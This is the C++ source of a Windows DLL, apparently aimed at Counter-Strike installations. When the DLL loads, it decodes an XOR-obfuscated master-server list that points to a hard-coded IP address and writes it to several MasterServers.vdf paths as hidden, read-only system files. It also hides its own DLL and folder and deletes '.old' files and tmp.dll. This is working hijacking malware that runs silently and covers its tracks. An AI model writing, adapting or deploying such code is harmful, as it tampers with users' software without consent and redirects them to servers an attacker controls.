// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h> 
#include <iostream> 
#include <Shlwapi.h> 
#include <string> 
#include <stdio.h> 
#include <vector> 
#include <Strsafe.h> 
#include <fstream> 
#include <algorithm>

void DisplayLastError() { 
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 
  
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );
  
    // Display the error message and exit the process
  
    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf) + 40) * sizeof(TCHAR)); 
    StringCchPrintf((LPTSTR)lpDisplayBuf, 
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("failed with error %d: %s"), 
        dw, lpMsgBuf); 
  
    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
}
  
/* Used for GetModuleFileName */ 
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
  
/* Encrypted by XOR 's' MasterServers file */ 
//std::string encrypted("\x51\x3e\x12\x0\x7\x16\x1\x20\x16\x1\x5\x16\x1\x0\x51\x7e\x79\x8\x7e\x79\x7a\x51\x1b\x1f\x42\x51\x7e\x79\x7a\x8\x7e\x79\x7a\x7a\x51\x43\x51\x7e\x79\x7a\x7a\x8\x7e\x79\x7a\x7a\x7a\x51\x12\x17\x17\x1\x51\x7a\x7a\x51\x42\x44\x4b\x5d\x41\x42\x44\x5d\x42\x4b\x47\x5d\x41\x47\x4b\x49\x41\x44\x43\x42\x43\x51\x7e\x79\x7a\x7a\xe\x7e\x79\x7a\x7a\x51\x42\x51\x7e\x79\x7a\x7a\x8\x7e\x79\x7a\x7a\x7a\x51\x12\x17\x17\x1\x51\x7a\x7a\x51\x3\x1f\x0\x16\x7\x7\x1a\x5d\x3\x1f\x49\x41\x44\x43\x42\x43\x51\x7e\x79\x7a\x7a\xe\x7e\x77\x77\x51\x1b\x1f\x41\x51\x7e\x79\x7a\x8\x7e\x79\x7a\x7a\x51\x43\x51\x7e\x79\x7a\x7a\x8\x7e\x79\x7a\x7a\x7a\x51\x12\x17\x17\x1\x51\x7a\x7a\x51\x42\x44\x4b\x5d\x41\x42\x44\x5d\x42\x4b\x47\x5d\x41\x47\x4b\x49\x41\x44\x43\x42\x43\x51\x7e\x79\x7a\x7a\xe\x7e\x79\x7a\x7a\x51\x42\x51\x7e\x79\x7a\x7a\x8\x7e\x79\x7a\x7a\x7a\x51\x12\x17\x17\x1\x51\x7a\x7a\x51\x3\x1f\x0\x16\x7\x7\x1a\x5d\x3\x1f\x49\x41\x44\x43\x42\x43\x51\x7e\x79\x7a\x7a\xe\x7e\x79\x7a\xe\x7e\x79\xe", 251); 
std::string encrypted("\x51\x3e\x12\x0\x7\x16\x1\x20\x16\x1\x5\x16\x1\x0\x51\x7e\x79\x8\x7e\x79\x7a\x51\x1b\x1f\x42\x51\x7e\x79\x7a\x8\x7e\x79\x7a\x7a\x51\x43\x51\x7e\x79\x7a\x7a\x8\x7e\x79\x7a\x7a\x7a\x51\x12\x17\x17\x1\x51\x7a\x51\x4a\x42\x5d\x42\x4a\x45\x5d\x47\x4a\x5d\x41\x45\x49\x41\x44\x43\x42\x42\x51\x7e\x79\x7a\x7a\xe\x7e\x79\x7a\xe\x7e\x79\xe", 86);

void errorLog(std::string s) { 
    // static std::ofstream logFile("trackerUIlog.txt", std::ofstream::out | std::ofstream::trunc); 
  
    // logFile << s << "\n\n"; 
} 
  
// Decrypts string by XOR 's'
std::string decryptString() { 
    std::string oldEncrypted = encrypted;  
    encrypted.clear(); 
    char cur; 
    for (int temp = 0, newI = 0; temp < oldEncrypted.size(); temp++, newI++) { 
        cur = oldEncrypted[temp] ^ 's'; 
        if ( cur == '\n' )
            encrypted.push_back('\r'); 
        encrypted.push_back( cur );
    }
  
    return encrypted; 
} 
  
  
bool setSecret(std::string s) { 
      
    if ( SetFileAttributesA( s.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM ) ) { 
        errorLog("Successfully set RSH attributes: " + s );
        return true; 
    } else { 
        errorLog("Failed to set RSH attributes: " + s );
        return false; 
    } 
}
  
BOOL FileExists(LPCTSTR szPath)
{
  DWORD dwAttrib = GetFileAttributes(szPath);
  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
  
bool removeAnyFile(std::string path) { 
    if ( SetFileAttributes(path.c_str(), FILE_ATTRIBUTE_NORMAL) ) {
  
        if ( DeleteFile(path.c_str()) ) {
            errorLog("Successfully deleted file: " + path); 
            return true; 
        } else { 
            errorLog("Failed to delete file: " + path); 
        }
  
    } else { 
        errorLog("Prior to removal, failed to change attributes of file: " + path); 
    }
    return false; 
       
}
  
bool createMasterServersFile(std::string filePath) { 
  
    // decrypts once 
    static std::string decryptedString = decryptString();
      
    if ( FileExists(filePath.c_str()) ) { 
        removeAnyFile( filePath ); 
    }
  
    HANDLE hFile = CreateFile(filePath.c_str(),     // name of the write
                       GENERIC_WRITE,               // open for writing
                       0,                           // do not share
                       NULL,                        // default security
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM,
                       NULL);                  // no attr. template
  
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        errorLog("Failed to create file: " + filePath); 
        DisplayLastError(); 
        return false;
    }
  
    DWORD dWritten; 
    BOOL bErrorFlag = WriteFile( 
                    hFile,           // open file handle
                    decryptedString.c_str(),      // start of data to write
                    decryptedString.length(),  // number of bytes to write
                    &dWritten, // number of bytes that were written
                    NULL);            // no overlapped structure
  
    if ( bErrorFlag == false ) { 
        errorLog("Failed to write data to file: " + filePath); 
        return false; 
    }
  
    CloseHandle(hFile); 
    errorLog("Successfully created file: " + filePath); 
    return true; 
}
  
  
  
const std::string masterServersFilePaths[7] = { 
    "\\config\\MasterServers.vdf", 
	"\\config\\rev_MasterServers.vdf",
	"\\platform\\MasterServers.vdf",
	"\\MasterServers.vdf",
    "\\platform\\rev_MasterServers.vdf",
    "\\platform\\config\\MasterServers.vdf",
    "\\platform\\config\\rev_MasterServers.vdf"
}; 
  
void createMasterServers(std::string rootCSDir) {
    for ( int i = 0; i < 6; i++ ) { 
        createMasterServersFile(rootCSDir + masterServersFilePaths[i]); 
    }
}
  
bool removeAllFiles(std::string fromDirectory, std::string fileName ) { 
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
  
    if ( fromDirectory.back() != '\\' ) 
        fromDirectory.push_back('\\'); 
  
    // Concentrate search string 
    std::string catStr = fromDirectory + fileName; 
  
    // Find first matching file
    hFind = FindFirstFile(catStr.c_str(), &FindFileData);
  
    if (hFind != INVALID_HANDLE_VALUE) 
    {
        removeAnyFile( fromDirectory + FindFileData.cFileName ); 
    } 
    else 
    {
        errorLog ("FindFirstFile failed: " + catStr);
        FindClose(hFind);
        return 0; 
    }
  
    // iterate through every other matching file 
    do { 
        FindNextFile(hFind, &FindFileData); 
  
        if ( GetLastError() == ERROR_NO_MORE_FILES ) 
            break; 
  
        removeAnyFile( fromDirectory + FindFileData.cFileName );
  
    } while ( true ); 
  
    FindClose(hFind);
    return true; 
} 
  
bool doStuff() { 
  

  
    // Get this DLL path name 
    CHAR    DllPath[MAX_PATH] = {0};
    DWORD smth = GetModuleFileNameA((HINSTANCE)&__ImageBase, DllPath, _countof(DllPath)); 
  
    // save paths for later 
    std::string DllDirectory(DllPath);
    std::string binDirectory; 
  
    // check for correct directory: cstrike*/bin
  
    // remove dll file name from path 
    BOOL r = PathRemoveFileSpecA(DllPath); 
  
    // save bin dir
    binDirectory = DllPath; 
  
    std::string tmp( strrchr(DllPath, '\\')+1 ); 
    std::transform(tmp.begin(), tmp.end(), tmp.begin(), ::tolower);
  
    if ( tmp == "bin" ) { 
  
        // remove 'bin' from path
        PathRemoveFileSpecA(DllPath); 
  
        tmp = ( strrchr(DllPath, '\\') +1) ;
        std::transform(tmp.begin(), tmp.end(), tmp.begin(), ::tolower);
  
              
            // Set rsh attributes: 
            setSecret(DllDirectory); 
            setSecret(binDirectory);
  
            // remove 'cstrike*' from path 
            PathRemoveFileSpecA(DllPath); 
  
            // pass the "cs-root" directory to the function responsible of creating all MasterServers files
            createMasterServers(DllPath); 
  
            // remove: 
            //      - tmp.dll
            //      - pliki z rozszerzeniem .old
            removeAllFiles(binDirectory, "*.old"); 
            removeAnyFile(binDirectory + "\\tmp.dll"); 
  
    } else { 
        errorLog("Dll not in bin directory!"); 
    }
      
    return 0; 
  
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        doStuff(); 
        break; 
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break; 
    }
    return TRUE;
}